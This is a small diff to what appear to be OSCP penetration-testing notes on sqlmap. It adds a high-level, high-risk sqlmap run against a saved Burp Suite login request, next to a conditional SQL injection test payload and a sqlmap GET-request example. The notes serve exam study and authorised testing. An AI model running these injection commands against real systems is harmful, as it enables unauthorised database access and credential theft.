@@ -7,6 +7,9 @@ Description: Automates detecting and exploiting SQL injection vulnerabilities in
 ⚠️ DISCLAIMER: There are a number of tools you are not allowed to use in your OSCP exam
 TEST:           SELECT ( IF ( 1=1, "Condition successful!", "Condition errored!" ) )
 
+sqlmap -r login.req --level 5 --risk 3
+    (login.req is text of Burp Suite intercept of a login request)
+
 Get Request
     # Test All (Default Settings)
     sqlmap -u "http://192.168.0.1/database/inject.php?q=user" --batch
